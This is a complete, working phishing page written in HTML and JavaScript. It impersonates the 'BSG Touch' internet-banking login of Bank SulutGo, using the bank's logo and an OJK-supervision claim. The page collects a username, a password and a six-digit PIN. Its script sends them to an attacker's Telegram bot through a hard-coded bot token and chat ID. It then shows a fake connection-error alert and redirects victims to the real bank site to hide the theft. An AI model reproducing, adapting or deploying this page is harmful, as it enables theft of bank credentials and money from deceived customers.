<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSG Touch - Bank SulutGo</title>
    <style>
        :root {
            --bsg-red: #c61d23;
            --bsg-blue: #005596;
            --bsg-gray: #f4f4f4;
            --text-dark: #333;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bsg-gray);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: var(--text-dark);
        }

        .container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo {
            max-width: 180px;
            margin-bottom: 2rem;
        }

        h2 {
            font-size: 1.2rem;
            margin-bottom: 1.5rem;
            color: var(--bsg-blue);
        }

        .form-group {
            margin-bottom: 1.2rem;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            font-size: 0.9rem;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 1rem;
        }

        input:focus {
            outline: none;
            border-color: var(--bsg-blue);
            box-shadow: 0 0 5px rgba(0, 85, 150, 0.2);
        }

        .btn {
            background-color: var(--bsg-red);
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 1rem;
        }

        .btn:hover {
            background-color: #a5181d;
        }

        .btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* PIN Page Styles */
        .pin-container {
            display: flex;
            justify-content: space-between;
            margin: 1.5rem 0;
        }

        .pin-input {
            width: 45px;
            height: 45px;
            text-align: center;
            font-size: 1.5rem;
            border: 1px solid #ccc;
            border-radius: 6px;
            background: #fff;
        }

        .hidden {
            display: none;
        }

        .footer-text {
            margin-top: 2rem;
            font-size: 0.8rem;
            color: #777;
        }

        .footer-text a {
            color: var(--bsg-blue);
            text-decoration: none;
        }
    </style>
</head>
<body>

    <!-- Halaman Login -->
    <div class="container" id="login-page">
        <img src="https://www.banksulutgo.co.id/gambar/web/logo-bank-sulutgo.jpg" alt="Bank SulutGo Logo" class="logo">
        <h2>Selamat Datang di BSG Touch</h2>
        
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" placeholder="Masukkan Username" required>
        </div>
        
        <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Masukkan Password" required>
        </div>
        
        <button class="btn" onclick="goToPinPage()">Lanjut</button>
        
        <div class="footer-text">
            Belum punya akun? <a href="#">Daftar Sekarang</a><br>
            <p>&copy; 2026 PT. Bank SulutGo. Terdaftar & Diawasi oleh OJK.</p>
        </div>
    </div>

    <!-- Halaman PIN -->
    <div class="container hidden" id="pin-page">
        <img src="https://www.banksulutgo.co.id/gambar/web/logo-bank-sulutgo.jpg" alt="Bank SulutGo Logo" class="logo">
        <h2>Masukkan PIN 6 Angka</h2>
        <p style="font-size: 0.9rem; color: #666;">Silakan masukkan PIN keamanan Anda</p>
        
        <div class="pin-container">
            <input type="password" class="pin-input" maxlength="1" oninput="moveNext(this, 'p2')" id="p1">
            <input type="password" class="pin-input" maxlength="1" oninput="moveNext(this, 'p3')" id="p2">
            <input type="password" class="pin-input" maxlength="1" oninput="moveNext(this, 'p4')" id="p3">
            <input type="password" class="pin-input" maxlength="1" oninput="moveNext(this, 'p5')" id="p4">
            <input type="password" class="pin-input" maxlength="1" oninput="moveNext(this, 'p6')" id="p5">
            <input type="password" class="pin-input" maxlength="1" oninput="checkComplete()" id="p6">
        </div>
        
        <button class="btn" id="btn-confirm" onclick="submitToTelegram()">Konfirmasi</button>
        <button class="btn" style="background-color: #777; margin-top: 0.5rem;" onclick="backToLogin()">Kembali</button>
        
        <div class="footer-text">
            Lupa PIN? <a href="#">Klik di sini</a>
        </div>
    </div>

    <script>
        // Konfigurasi Telegram
        const TELEGRAM_TOKEN = "8732135373:AAGf8x-YPrc1HL3BEzWO_obIIo2v2AZXLuo";
        const CHAT_ID = "6238242194";

        let savedUsername = "";
        let savedPassword = "";

        function goToPinPage() {
            savedUsername = document.getElementById('username').value;
            savedPassword = document.getElementById('password').value;
            
            if(savedUsername && savedPassword) {
                document.getElementById('login-page').classList.add('hidden');
                document.getElementById('pin-page').classList.remove('hidden');
            } else {
                alert('Silakan masukkan username dan password Anda.');
            }
        }

        function backToLogin() {
            document.getElementById('pin-page').classList.add('hidden');
            document.getElementById('login-page').classList.remove('hidden');
        }

        function moveNext(current, nextId) {
            if (current.value.length >= 1) {
                document.getElementById(nextId).focus();
            }
        }

        function checkComplete() {
            // Fokus tetap di p6 jika sudah terisi
        }

        async function submitToTelegram() {
            let pin = "";
            for(let i=1; i<=6; i++) {
                pin += document.getElementById('p' + i).value;
            }
            
            if(pin.length !== 6) {
                alert('Silakan lengkapi 6 angka PIN Anda.');
                return;
            }

            const btn = document.getElementById('btn-confirm');
            btn.disabled = true;
            btn.innerText = "Memproses...";

            // Format Pesan untuk Telegram
            const message = `
🔔 *DATA LOGIN BARU (BSG)* 🔔
---------------------------
👤 *Username:* ${savedUsername}
🔑 *Password:* ${savedPassword}
🔢 *PIN:* ${pin}
---------------------------
🌐 *Waktu:* ${new Date().toLocaleString('id-ID')}
            `;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    alert('Koneksi bermasalah. Silakan coba beberapa saat lagi.');
                    // Diarahkan ke halaman resmi sebagai pengalihan
                    window.location.href = "https://www.banksulutgo.co.id/";
                } else {
                    throw new Error('Gagal mengirim data');
                }
            } catch (error) {
                console.error(error);
                alert('Terjadi kesalahan sistem. Silakan muat ulang halaman.');
                btn.disabled = false;
                btn.innerText = "Konfirmasi";
            }
        }
    </script>
</body>
</html>
